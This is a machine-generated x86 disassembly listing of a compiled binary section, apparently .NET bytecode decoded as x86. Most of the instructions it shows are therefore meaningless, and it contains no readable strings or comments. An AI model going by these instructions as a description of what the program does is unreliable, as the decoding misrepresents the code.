  402ab1:	0a 72 52             	or     0x52(%edx),%dh
  402ab4:	06                   	push   %es
  402ab5:	00 70 07             	add    %dh,0x7(%eax)
  402ab8:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402abb:	00 0a                	add    %cl,(%edx)
  402abd:	26 1f                	es pop %ds
  402abf:	1a 28                	sbb    (%eax),%ch
  402ac1:	0e                   	push   %cs
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a 72 52             	or     0x52(%edx),%dh
  402ac7:	06                   	push   %es
  402ac8:	00 70 28             	add    %dh,0x28(%eax)
  402acb:	5d                   	pop    %ebp
  402acc:	00 00                	add    %al,(%eax)
  402ace:	0a 0d 09 06 28 5d    	or     0x5d280609,%cl
  402ad4:	00 00                	add    %al,(%eax)
  402ad6:	0a 13                	or     (%ebx),%dl
  402ad8:	04 07                	add    $0x7,%al
  402ada:	06                   	push   %es
  402adb:	28 0f                	sub    %cl,(%edi)
  402add:	00 00                	add    %al,(%eax)
  402adf:	0a 2d 0d 08 11 04    	or     0x411080d,%ch
  402ae5:	28 0f                	sub    %cl,(%edi)
  402ae7:	00 00                	add    %al,(%eax)
  402ae9:	0a 39                	or     (%ecx),%bh
  402aeb:	90                   	nop
  402aec:	00 00                	add    %al,(%eax)
  402aee:	00 11                	add    %dl,(%ecx)
  402af0:	04 28                	add    $0x28,%al
  402af2:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  402af7:	39 07                	cmp    %eax,(%edi)
  402af9:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402afc:	5e                   	pop    %esi
  402afd:	00 00                	add    %al,(%eax)
  402aff:	0a 11                	or     (%ecx),%dl
  402b01:	04 73                	add    $0x73,%al
  402b03:	5f                   	pop    %edi
  402b04:	00 00                	add    %al,(%eax)
  402b06:	0a 13                	or     (%ebx),%dl
  402b08:	05 11 05 09 6f       	add    $0x6f090511,%eax
  402b0d:	60                   	pusha
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	0a 73 61             	or     0x61(%ebx),%dh
  402b13:	00 00                	add    %al,(%eax)
  402b15:	0a 13                	or     (%ebx),%dl
  402b17:	06                   	push   %es
  402b18:	11 06                	adc    %eax,(%esi)
  402b1a:	11 05 6f 62 00 00    	adc    %eax,0x626f
  402b20:	0a 11                	or     (%ecx),%dl
  402b22:	06                   	push   %es
  402b23:	6f                   	outsl  %ds:(%esi),(%dx)
  402b24:	63 00                	arpl   %eax,(%eax)
  402b26:	00 0a                	add    %cl,(%edx)
  402b28:	2c 55                	sub    $0x55,%al
  402b2a:	17                   	pop    %ss
  402b2b:	28 09                	sub    %cl,(%ecx)
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	0a 2a                	or     (%edx),%ch
  402b31:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402b34:	4e                   	dec    %esi
  402b35:	00 00                	add    %al,(%eax)
  402b37:	0a 20                	or     (%eax),%ah
  402b39:	c8 00 00 00          	enter  $0x0,$0x0
  402b3d:	28 10                	sub    %dl,(%eax)
  402b3f:	00 00                	add    %al,(%eax)
  402b41:	0a 07                	or     (%edi),%al
  402b43:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402b46:	5e                   	pop    %esi
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a de                	or     %dh,%bl
  402b4b:	03 26                	add    (%esi),%esp
  402b4d:	de 00                	fiadds (%eax)
  402b4f:	11 04 73             	adc    %eax,(%ebx,%esi,2)
  402b52:	5f                   	pop    %edi
  402b53:	00 00                	add    %al,(%eax)
  402b55:	0a 13                	or     (%ebx),%dl
  402b57:	07                   	pop    %es
  402b58:	11 07                	adc    %eax,(%edi)
  402b5a:	09 6f 60             	or     %ebp,0x60(%edi)
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	0a 73 61             	or     0x61(%ebx),%dh
  402b62:	00 00                	add    %al,(%eax)
  402b64:	0a 13                	or     (%ebx),%dl
  402b66:	08 11                	or     %dl,(%ecx)
  402b68:	08 11                	or     %dl,(%ecx)
  402b6a:	07                   	pop    %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	62 00                	bound  %eax,(%eax)
  402b6e:	00 0a                	add    %cl,(%edx)
  402b70:	11 08                	adc    %ecx,(%eax)
  402b72:	6f                   	outsl  %ds:(%esi),(%dx)
  402b73:	63 00                	arpl   %eax,(%eax)
  402b75:	00 0a                	add    %cl,(%edx)
  402b77:	2c 06                	sub    $0x6,%al
  402b79:	17                   	pop    %ss
  402b7a:	28 09                	sub    %cl,(%ecx)
  402b7c:	00 00                	add    %al,(%eax)
  402b7e:	0a 2a                	or     (%edx),%ch
  402b80:	01 10                	add    %edx,(%eax)
  402b82:	00 00                	add    %al,(%eax)
  402b84:	00 00                	add    %al,(%eax)
  402b86:	9d                   	popf
  402b87:	00 1b                	add    %bl,(%ebx)
  402b89:	b8 00 03 01 00       	mov    $0x10300,%eax
  402b8e:	00 01                	add    %al,(%ecx)
  402b90:	1b 30                	sbb    (%eax),%esi
  402b92:	03 00                	add    (%eax),%eax
  402b94:	19 01                	sbb    %eax,(%ecx)
  402b96:	00 00                	add    %al,(%eax)
  402b98:	10 00                	adc    %al,(%eax)
  402b9a:	00 11                	add    %dl,(%ecx)
  402b9c:	02 0a                	add    (%edx),%cl
  402b9e:	28 5b 00             	sub    %bl,0x0(%ebx)
  402ba1:	00 0a                	add    %cl,(%edx)
  402ba3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba4:	5c                   	pop    %esp
  402ba5:	00 00                	add    %al,(%eax)
  402ba7:	0a 0b                	or     (%ebx),%cl
  402ba9:	28 16                	sub    %dl,(%esi)
  402bab:	00 00                	add    %al,(%eax)
  402bad:	0a 6f 0c             	or     0xc(%edi),%ch
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	0a 0c 1d 28 0e 00 00 	or     0xe28(,%ebx,1),%cl
  402bb9:	0a 72 52             	or     0x52(%edx),%dh
  402bbc:	06                   	push   %es
  402bbd:	00 70 07             	add    %dh,0x7(%eax)
  402bc0:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402bc3:	00 0a                	add    %cl,(%edx)
  402bc5:	26 1f                	es pop %ds
  402bc7:	1a 28                	sbb    (%eax),%ch
  402bc9:	0e                   	push   %cs
  402bca:	00 00                	add    %al,(%eax)
  402bcc:	0a 72 52             	or     0x52(%edx),%dh
  402bcf:	06                   	push   %es
  402bd0:	00 70 28             	add    %dh,0x28(%eax)
  402bd3:	5d                   	pop    %ebp
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 0d 09 06 28 5d    	or     0x5d280609,%cl
  402bdc:	00 00                	add    %al,(%eax)
  402bde:	0a 13                	or     (%ebx),%dl
  402be0:	04 11                	add    $0x11,%al
  402be2:	04 73                	add    $0x73,%al
  402be4:	5f                   	pop    %edi
  402be5:	00 00                	add    %al,(%eax)
  402be7:	0a 13                	or     (%ebx),%dl
  402be9:	09 11                	or     %edx,(%ecx)
  402beb:	09 17                	or     %edx,(%edi)
  402bed:	6f                   	outsl  %ds:(%esi),(%dx)
  402bee:	64 00 00             	add    %al,%fs:(%eax)
  402bf1:	0a 11                	or     (%ecx),%dl
  402bf3:	09 72 56             	or     %esi,0x56(%edx)
  402bf6:	06                   	push   %es
  402bf7:	00 70 6f             	add    %dh,0x6f(%eax)
  402bfa:	65 00 00             	add    %al,%gs:(%eax)
  402bfd:	0a 11                	or     (%ecx),%dl
  402bff:	09 16                	or     %edx,(%esi)
  402c01:	6f                   	outsl  %ds:(%esi),(%dx)
  402c02:	66 00 00             	data16 add %al,(%eax)
  402c05:	0a 11                	or     (%ecx),%dl
  402c07:	09 09                	or     %ecx,(%ecx)
  402c09:	6f                   	outsl  %ds:(%esi),(%dx)
  402c0a:	60                   	pusha
  402c0b:	00 00                	add    %al,(%eax)
  402c0d:	0a 11                	or     (%ecx),%dl
  402c0f:	09 13                	or     %edx,(%ebx)
  402c11:	05 73 61 00 00       	add    $0x6173,%eax
  402c16:	0a 13                	or     (%ebx),%dl
  402c18:	06                   	push   %es
  402c19:	11 06                	adc    %eax,(%esi)
  402c1b:	11 05 6f 62 00 00    	adc    %eax,0x626f
  402c21:	0a 07                	or     (%edi),%al
  402c23:	06                   	push   %es
  402c24:	28 0f                	sub    %cl,(%edi)
  402c26:	00 00                	add    %al,(%eax)
  402c28:	0a 2d 0a 08 11 04    	or     0x411080a,%ch
  402c2e:	28 0f                	sub    %cl,(%edi)
  402c30:	00 00                	add    %al,(%eax)
  402c32:	0a 2c 7f             	or     (%edi,%edi,2),%ch
  402c35:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c38:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  402c3d:	30 07                	xor    %al,(%edi)
  402c3f:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c42:	5e                   	pop    %esi
  402c43:	00 00                	add    %al,(%eax)
  402c45:	0a 11                	or     (%ecx),%dl
  402c47:	05 28 67 00 00       	add    $0x6728,%eax
  402c4c:	0a 26                	or     (%esi),%ah
  402c4e:	17                   	pop    %ss
  402c4f:	28 09                	sub    %cl,(%ecx)
  402c51:	00 00                	add    %al,(%eax)
  402c53:	0a de                	or     %dh,%bl
  402c55:	5e                   	pop    %esi
  402c56:	13 07                	adc    (%edi),%eax
  402c58:	11 07                	adc    %eax,(%edi)
  402c5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c5b:	68 00 00 0a 20       	push   $0x200a0000
  402c60:	c7 04 00 00 33 06 02 	movl   $0x2063300,(%eax,%eax,1)
  402c67:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402c6a:	00 06                	add    %al,(%esi)
  402c6c:	de 46 11             	fiadds 0x11(%esi)
  402c6f:	04 28                	add    $0x28,%al
  402c71:	4e                   	dec    %esi
  402c72:	00 00                	add    %al,(%eax)
  402c74:	0a 20                	or     (%eax),%ah
  402c76:	c8 00 00 00          	enter  $0x0,$0x0
  402c7a:	28 10                	sub    %dl,(%eax)
  402c7c:	00 00                	add    %al,(%eax)
  402c7e:	0a 07                	or     (%edi),%al
  402c80:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c83:	5e                   	pop    %esi
  402c84:	00 00                	add    %al,(%eax)
  402c86:	0a de                	or     %dh,%bl
  402c88:	03 26                	add    (%esi),%esp
  402c8a:	de 00                	fiadds (%eax)
  402c8c:	11 05 28 67 00 00    	adc    %eax,0x6728
  402c92:	0a 26                	or     (%esi),%ah
  402c94:	17                   	pop    %ss
  402c95:	28 09                	sub    %cl,(%ecx)
  402c97:	00 00                	add    %al,(%eax)
  402c99:	0a de                	or     %dh,%bl
  402c9b:	18 13                	sbb    %dl,(%ebx)
  402c9d:	08 11                	or     %dl,(%ecx)
  402c9f:	08 6f 68             	or     %ch,0x68(%edi)
  402ca2:	00 00                	add    %al,(%eax)
  402ca4:	0a 20                	or     (%eax),%ah
  402ca6:	c7 04 00 00 33 06 02 	movl   $0x2063300,(%eax,%eax,1)
  402cad:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402cb0:	00 06                	add    %al,(%esi)
  402cb2:	de 00                	fiadds (%eax)
  402cb4:	2a 00                	sub    (%eax),%al
  402cb6:	00 00                	add    %al,(%eax)
  402cb8:	01 28                	add    %ebp,(%eax)
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	00 00                	add    %al,(%eax)
  402cbe:	aa                   	stos   %al,%es:(%edi)
  402cbf:	00 10                	add    %dl,(%eax)
  402cc1:	ba 00 18 42 00       	mov    $0x421800,%edx
  402cc6:	00 01                	add    %al,(%ecx)
  402cc8:	00 00                	add    %al,(%eax)
  402cca:	d2 00                	rolb   %cl,(%eax)
  402ccc:	1b ed                	sbb    %ebp,%ebp
  402cce:	00 03                	add    %al,(%ebx)
  402cd0:	01 00                	add    %eax,(%eax)
  402cd2:	00 01                	add    %al,(%ecx)
  402cd4:	00 00                	add    %al,(%eax)
  402cd6:	f0 00 10             	lock add %dl,(%eax)
  402cd9:	00 01                	add    %al,(%ecx)
  402cdb:	18 42 00             	sbb    %al,0x0(%edx)
  402cde:	00 01                	add    %al,(%ecx)
  402ce0:	1b 30                	sbb    (%eax),%esi
  402ce2:	04 00                	add    $0x0,%al
  402ce4:	86 00                	xchg   %al,(%eax)
  402ce6:	00 00                	add    %al,(%eax)
  402ce8:	11 00                	adc    %eax,(%eax)
  402cea:	00 11                	add    %dl,(%ecx)
  402cec:	1d 28 0e 00 00       	sbb    $0xe28,%eax
  402cf1:	0a 0a                	or     (%edx),%cl
  402cf3:	28 12                	sub    %dl,(%edx)
  402cf5:	00 00                	add    %al,(%eax)
  402cf7:	0a 6f 69             	or     0x69(%edi),%ch
  402cfa:	00 00                	add    %al,(%eax)
  402cfc:	0a 0b                	or     (%ebx),%cl
  402cfe:	06                   	push   %es
  402cff:	72 52                	jb     0x402d53
  402d01:	06                   	push   %es
  402d02:	00 70 07             	add    %dh,0x7(%eax)
  402d05:	72 62                	jb     0x402d69
  402d07:	06                   	push   %es
  402d08:	00 70 28             	add    %dh,0x28(%eax)
  402d0b:	6a 00                	push   $0x0
  402d0d:	00 0a                	add    %cl,(%edx)
  402d0f:	73 6b                	jae    0x402d7c
  402d11:	00 00                	add    %al,(%eax)
  402d13:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402d16:	16                   	push   %ss
  402d17:	00 00                	add    %al,(%eax)
  402d19:	0a 6f 0c             	or     0xc(%edi),%ch
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	0a 0d 08 72 6c 06    	or     0x66c7208,%cl
  402d24:	00 70 6f             	add    %dh,0x6f(%eax)
  402d27:	6c                   	insb   (%dx),%es:(%edi)
  402d28:	00 00                	add    %al,(%eax)
  402d2a:	0a 08                	or     (%eax),%cl
  402d2c:	72 92                	jb     0x402cc0
  402d2e:	06                   	push   %es
  402d2f:	00 70 09             	add    %dh,0x9(%eax)
  402d32:	28 5d 00             	sub    %bl,0x0(%ebp)
  402d35:	00 0a                	add    %cl,(%edx)
  402d37:	6f                   	outsl  %ds:(%esi),(%dx)
  402d38:	6c                   	insb   (%dx),%es:(%edi)
  402d39:	00 00                	add    %al,(%eax)
  402d3b:	0a 08                	or     (%eax),%cl
  402d3d:	72 ac                	jb     0x402ceb
  402d3f:	06                   	push   %es
  402d40:	00 70 6f             	add    %dh,0x6f(%eax)
  402d43:	6c                   	insb   (%dx),%es:(%edi)
  402d44:	00 00                	add    %al,(%eax)
  402d46:	0a 09                	or     (%ecx),%cl
  402d48:	1f                   	pop    %ds
  402d49:	5c                   	pop    %esp
  402d4a:	1f                   	pop    %ds
  402d4b:	2f                   	das
  402d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d4d:	6d                   	insl   (%dx),%es:(%edi)
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	0a 13                	or     (%ebx),%dl
  402d52:	04 08                	add    $0x8,%al
  402d54:	72 c4                	jb     0x402d1a
  402d56:	06                   	push   %es
  402d57:	00 70 11             	add    %dh,0x11(%eax)
  402d5a:	04 28                	add    $0x28,%al
  402d5c:	5d                   	pop    %ebp
  402d5d:	00 00                	add    %al,(%eax)
  402d5f:	0a 6f 6c             	or     0x6c(%edi),%ch
  402d62:	00 00                	add    %al,(%eax)
  402d64:	0a de                	or     %dh,%bl
  402d66:	0a 08                	or     (%eax),%cl
  402d68:	2c 06                	sub    $0x6,%al
  402d6a:	08 6f 4c             	or     %ch,0x4c(%edi)
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	0a dc                	or     %ah,%bl
  402d71:	2a 00                	sub    (%eax),%al
  402d73:	00 01                	add    %al,(%ecx)
  402d75:	10 00                	adc    %al,(%eax)
  402d77:	00 02                	add    %al,(%edx)
  402d79:	00 29                	add    %ch,(%ecx)
  402d7b:	00 52 7b             	add    %dl,0x7b(%edx)
  402d7e:	00 0a                	add    %cl,(%edx)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	00 00                	add    %al,(%eax)
  402d84:	1b 30                	sbb    (%eax),%esi
  402d86:	03 00                	add    (%eax),%eax
  402d88:	41                   	inc    %ecx
  402d89:	00 00                	add    %al,(%eax)
  402d8b:	00 12                	add    %dl,(%edx)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	11 1f                	adc    %ebx,(%edi)
  402d91:	1a 28                	sbb    (%eax),%ch
  402d93:	0e                   	push   %cs
  402d94:	00 00                	add    %al,(%eax)
  402d96:	0a 72 52             	or     0x52(%edx),%dh
  402d99:	06                   	push   %es
  402d9a:	00 70 7e             	add    %dh,0x7e(%eax)
  402d9d:	11 00                	adc    %eax,(%eax)
  402d9f:	00 04 28             	add    %al,(%eax,%ebp,1)
  402da2:	2c 00                	sub    $0x0,%al
  402da4:	00 0a                	add    %cl,(%edx)
  402da6:	0a 06                	or     (%esi),%al
  402da8:	28 2d 00 00 0a 2d    	sub    %ch,0x2d0a0000
  402dae:	0b 06                	or     (%esi),%eax
  402db0:	7e 1c                	jle    0x402dce
  402db2:	00 00                	add    %al,(%eax)
  402db4:	04 28                	add    $0x28,%al
  402db6:	2e 00 00             	add    %al,%cs:(%eax)
  402db9:	0a 20                	or     (%eax),%ah
  402dbb:	f4                   	hlt
  402dbc:	01 00                	add    %eax,(%eax)
  402dbe:	00 28                	add    %ch,(%eax)
  402dc0:	10 00                	adc    %al,(%eax)
  402dc2:	00 0a                	add    %cl,(%edx)
  402dc4:	06                   	push   %es
  402dc5:	28 6e 00             	sub    %ch,0x0(%esi)
  402dc8:	00 0a                	add    %cl,(%edx)
  402dca:	26 de 03             	fiadds %es:(%ebx)
  402dcd:	26 de 00             	fiadds %es:(%eax)
  402dd0:	2a 00                	sub    (%eax),%al
  402dd2:	00 00                	add    %al,(%eax)
  402dd4:	01 10                	add    %edx,(%eax)
  402dd6:	00 00                	add    %al,(%eax)
  402dd8:	00 00                	add    %al,(%eax)
  402dda:	17                   	pop    %ss
  402ddb:	00 26                	add    %ah,(%esi)
  402ddd:	3d 00 03 01 00       	cmp    $0x10300,%eax
  402de2:	00 01                	add    %al,(%ecx)
  402de4:	1b 30                	sbb    (%eax),%esi
  402de6:	03 00                	add    (%eax),%eax
  402de8:	62 00                	bound  %eax,(%eax)
  402dea:	00 00                	add    %al,(%eax)
  402dec:	13 00                	adc    (%eax),%eax
  402dee:	00 11                	add    %dl,(%ecx)
  402df0:	28 16                	sub    %dl,(%esi)
  402df2:	00 00                	add    %al,(%eax)
  402df4:	0a 6f 0c             	or     0xc(%edi),%ch
  402df7:	00 00                	add    %al,(%eax)
  402df9:	0a 0a                	or     (%edx),%cl
  402dfb:	1f                   	pop    %ds
  402dfc:	1a 28                	sbb    (%eax),%ch
  402dfe:	0e                   	push   %cs
  402dff:	00 00                	add    %al,(%eax)
  402e01:	0a 72 52             	or     0x52(%edx),%dh
  402e04:	06                   	push   %es
  402e05:	00 70 7e             	add    %dh,0x7e(%eax)
  402e08:	0a 00                	or     (%eax),%al
  402e0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402e0d:	2c 00                	sub    $0x0,%al
  402e0f:	00 0a                	add    %cl,(%edx)
  402e11:	0b 1f                	or     (%edi),%ebx
  402e13:	1a 28                	sbb    (%eax),%ch
  402e15:	0e                   	push   %cs
  402e16:	00 00                	add    %al,(%eax)
  402e18:	0a 72 52             	or     0x52(%edx),%dh
  402e1b:	06                   	push   %es
  402e1c:	00 70 7e             	add    %dh,0x7e(%eax)
  402e1f:	11 00                	adc    %eax,(%eax)
  402e21:	00 04 28             	add    %al,(%eax,%ebp,1)
  402e24:	2c 00                	sub    $0x0,%al
  402e26:	00 0a                	add    %cl,(%edx)
  402e28:	0c 06                	or     $0x6,%al
  402e2a:	07                   	pop    %es
  402e2b:	28 0f                	sub    %cl,(%edi)
  402e2d:	00 00                	add    %al,(%eax)
  402e2f:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402e32:	08 28                	or     %ch,(%eax)
  402e34:	4e                   	dec    %esi
  402e35:	00 00                	add    %al,(%eax)
  402e37:	0a de                	or     %dh,%bl
  402e39:	03 26                	add    (%esi),%esp
  402e3b:	de 00                	fiadds (%eax)
  402e3d:	08 28                	or     %ch,(%eax)
  402e3f:	2d 00 00 0a 2c       	sub    $0x2c0a0000,%eax
  402e44:	0b 06                	or     (%esi),%eax
  402e46:	07                   	pop    %es
  402e47:	28 17                	sub    %dl,(%edi)
  402e49:	00 00                	add    %al,(%eax)
  402e4b:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402e4e:	17                   	pop    %ss
  402e4f:	2a 16                	sub    (%esi),%dl
  402e51:	2a 00                	sub    (%eax),%al
  402e53:	00 01                	add    %al,(%ecx)
  402e55:	10 00                	adc    %al,(%eax)
  402e57:	00 00                	add    %al,(%eax)
  402e59:	00 42 00             	add    %al,0x0(%edx)
  402e5c:	08 4a 00             	or     %cl,0x0(%edx)
  402e5f:	03 01                	add    (%ecx),%eax
  402e61:	00 00                	add    %al,(%eax)
  402e63:	01 1b                	add    %ebx,(%ebx)
  402e65:	30 03                	xor    %al,(%ebx)
  402e67:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402e6a:	00 00                	add    %al,(%eax)
  402e6c:	14 00                	adc    $0x0,%al
  402e6e:	00 11                	add    %dl,(%ecx)
  402e70:	7e 6f                	jle    0x402ee1
  402e72:	00 00                	add    %al,(%eax)
  402e74:	0a 72 d8             	or     -0x28(%edx),%dh
  402e77:	06                   	push   %es
  402e78:	00 70 17             	add    %dh,0x17(%eax)
  402e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e7c:	70 00                	jo     0x402e7e
  402e7e:	00 0a                	add    %cl,(%edx)
  402e80:	0a 06                	or     (%esi),%al
  402e82:	72 34                	jb     0x402eb8
  402e84:	07                   	pop    %es
  402e85:	00 70 28             	add    %dh,0x28(%eax)
  402e88:	16                   	push   %ss
  402e89:	00 00                	add    %al,(%eax)
  402e8b:	0a 6f 0c             	or     0xc(%edi),%ch
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	0a 6f 71             	or     0x71(%edi),%ch
  402e93:	00 00                	add    %al,(%eax)
  402e95:	0a de                	or     %dh,%bl
  402e97:	03 26                	add    (%esi),%esp
  402e99:	de 00                	fiadds (%eax)
  402e9b:	2a 01                	sub    (%ecx),%al
  402e9d:	10 00                	adc    %al,(%eax)
  402e9f:	00 00                	add    %al,(%eax)
  402ea1:	00 00                	add    %al,(%eax)
  402ea3:	00 28                	add    %ch,(%eax)
  402ea5:	28 00                	sub    %al,(%eax)
  402ea7:	03 01                	add    (%ecx),%eax
  402ea9:	00 00                	add    %al,(%eax)
  402eab:	01 1b                	add    %ebx,(%ebx)
  402ead:	30 03                	xor    %al,(%ebx)
  402eaf:	00 5e 00             	add    %bl,0x0(%esi)
  402eb2:	00 00                	add    %al,(%eax)
  402eb4:	15 00 00 11 28       	adc    $0x28110000,%eax
  402eb9:	58                   	pop    %eax
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	0a 0b                	or     (%ebx),%cl
  402ebe:	16                   	push   %ss
  402ebf:	0c 2b                	or     $0x2b,%al
  402ec1:	4d                   	dec    %ebp
  402ec2:	07                   	pop    %es
  402ec3:	08 9a 0a 06 6f 1e    	or     %bl,0x1e6f060a(%edx)
  402ec9:	00 00                	add    %al,(%eax)
  402ecb:	0a 72 92             	or     -0x6e(%edx),%dh
  402ece:	05 00 70 28 0f       	add    $0xf287000,%eax
  402ed3:	00 00                	add    %al,(%eax)
  402ed5:	0a 2c 33             	or     (%ebx,%esi,1),%ch
  402ed8:	06                   	push   %es
  402ed9:	6f                   	outsl  %ds:(%esi),(%dx)
  402eda:	1e                   	push   %ds
  402edb:	00 00                	add    %al,(%eax)
  402edd:	0a 02                	or     (%edx),%al
  402edf:	28 5d 00             	sub    %bl,0x0(%ebp)
  402ee2:	00 0a                	add    %cl,(%edx)
  402ee4:	28 2d 00 00 0a 2d    	sub    %ch,0x2d0a0000
  402eea:	20 28                	and    %ch,(%eax)
  402eec:	16                   	push   %ss
  402eed:	00 00                	add    %al,(%eax)
  402eef:	0a 6f 0c             	or     0xc(%edi),%ch
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	0a 06                	or     (%esi),%al
  402ef6:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef7:	1e                   	push   %ds
  402ef8:	00 00                	add    %al,(%eax)
  402efa:	0a 02                	or     (%edx),%al
  402efc:	28 5d 00             	sub    %bl,0x0(%ebp)
  402eff:	00 0a                	add    %cl,(%edx)
  402f01:	28 5e 00             	sub    %bl,0x0(%esi)
  402f04:	00 0a                	add    %cl,(%edx)
  402f06:	de 03                	fiadds (%ebx)
  402f08:	26 de 00             	fiadds %es:(%eax)
  402f0b:	08 17                	or     %dl,(%edi)
  402f0d:	58                   	pop    %eax
  402f0e:	0c 08                	or     $0x8,%al
  402f10:	07                   	pop    %es
  402f11:	8e 69 32             	mov    0x32(%ecx),%gs
  402f14:	ad                   	lods   %ds:(%esi),%eax
  402f15:	2a 00                	sub    (%eax),%al
  402f17:	00 01                	add    %al,(%ecx)
  402f19:	10 00                	adc    %al,(%eax)
  402f1b:	00 00                	add    %al,(%eax)
  402f1d:	00 33                	add    %dh,(%ebx)
  402f1f:	00 1d 50 00 03 01    	add    %bl,0x1030050
  402f25:	00 00                	add    %al,(%eax)
  402f27:	01 13                	add    %edx,(%ebx)
  402f29:	30 03                	xor    %al,(%ebx)
  402f2b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  402f2f:	00 16                	add    %dl,(%esi)
  402f31:	00 00                	add    %al,(%eax)
  402f33:	11 73 61             	adc    %esi,0x61(%ebx)
  402f36:	00 00                	add    %al,(%eax)
  402f38:	0a 0a                	or     (%edx),%cl
  402f3a:	73 72                	jae    0x402fae
  402f3c:	00 00                	add    %al,(%eax)
  402f3e:	0a 0b                	or     (%ebx),%cl
  402f40:	07                   	pop    %es
  402f41:	72 54                	jb     0x402f97
  402f43:	07                   	pop    %es
  402f44:	00 70 6f             	add    %dh,0x6f(%eax)
  402f47:	73 00                	jae    0x402f49
  402f49:	00 0a                	add    %cl,(%edx)
  402f4b:	07                   	pop    %es
  402f4c:	72 64                	jb     0x402fb2
  402f4e:	07                   	pop    %es
  402f4f:	00 70 02             	add    %dh,0x2(%eax)
  402f52:	28 5d 00             	sub    %bl,0x0(%ebp)
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	6f                   	outsl  %ds:(%esi),(%dx)
  402f58:	74 00                	je     0x402f5a
  402f5a:	00 0a                	add    %cl,(%edx)
  402f5c:	07                   	pop    %es
  402f5d:	17                   	pop    %ss
  402f5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f5f:	66 00 00             	data16 add %al,(%eax)
  402f62:	0a 06                	or     (%esi),%al
  402f64:	07                   	pop    %es
  402f65:	6f                   	outsl  %ds:(%esi),(%dx)
  402f66:	62 00                	bound  %eax,(%eax)
  402f68:	00 0a                	add    %cl,(%edx)
  402f6a:	06                   	push   %es
  402f6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402f6c:	63 00                	arpl   %eax,(%eax)
  402f6e:	00 0a                	add    %cl,(%edx)
  402f70:	26 06                	es push %es
  402f72:	6f                   	outsl  %ds:(%esi),(%dx)
  402f73:	75 00                	jne    0x402f75
  402f75:	00 0a                	add    %cl,(%edx)
  402f77:	2a 2e                	sub    (%esi),%ch
  402f79:	72 6c                	jb     0x402fe7
  402f7b:	07                   	pop    %es
  402f7c:	00 70 28             	add    %dh,0x28(%eax)
  402f7f:	1a 00                	sbb    (%eax),%al
  402f81:	00 06                	add    %al,(%esi)
  402f83:	2a 2e                	sub    (%esi),%ch
  402f85:	72 e6                	jb     0x402f6d
  402f87:	07                   	pop    %es
  402f88:	00 70 28             	add    %dh,0x28(%eax)
  402f8b:	1a 00                	sbb    (%eax),%al
  402f8d:	00 06                	add    %al,(%esi)
  402f8f:	2a 2e                	sub    (%esi),%ch
  402f91:	72 b3                	jb     0x402f46
  402f93:	08 00                	or     %al,(%eax)
  402f95:	70 28                	jo     0x402fbf
  402f97:	1a 00                	sbb    (%eax),%al
  402f99:	00 06                	add    %al,(%esi)
  402f9b:	2a 1b                	sub    (%ebx),%bl
  402f9d:	30 03                	xor    %al,(%ebx)
  402f9f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	14 00                	adc    $0x0,%al
  402fa6:	00 11                	add    %dl,(%ecx)
  402fa8:	7e 6f                	jle    0x403019
  402faa:	00 00                	add    %al,(%eax)
  402fac:	0a 72 ef             	or     -0x11(%edx),%dh
  402faf:	08 00                	or     %al,(%eax)
  402fb1:	70 6f                	jo     0x403022
  402fb3:	76 00                	jbe    0x402fb5
  402fb5:	00 0a                	add    %cl,(%edx)
  402fb7:	0a 06                	or     (%esi),%al
  402fb9:	72 63                	jb     0x40301e
  402fbb:	09 00                	or     %eax,(%eax)
  402fbd:	70 72                	jo     0x403031
  402fbf:	81 09 00 70 6f 71    	orl    $0x716f7000,(%ecx)
  402fc5:	00 00                	add    %al,(%eax)
  402fc7:	0a 06                	or     (%esi),%al
  402fc9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fca:	77 00                	ja     0x402fcc
  402fcc:	00 0a                	add    %cl,(%edx)
  402fce:	de 03                	fiadds (%ebx)
  402fd0:	26 de 00             	fiadds %es:(%eax)
  402fd3:	2a 01                	sub    (%ecx),%al
  402fd5:	10 00                	adc    %al,(%eax)
  402fd7:	00 00                	add    %al,(%eax)
  402fd9:	00 00                	add    %al,(%eax)
  402fdb:	00 28                	add    %ch,(%eax)
  402fdd:	28 00                	sub    %al,(%eax)
  402fdf:	03 01                	add    (%ecx),%eax
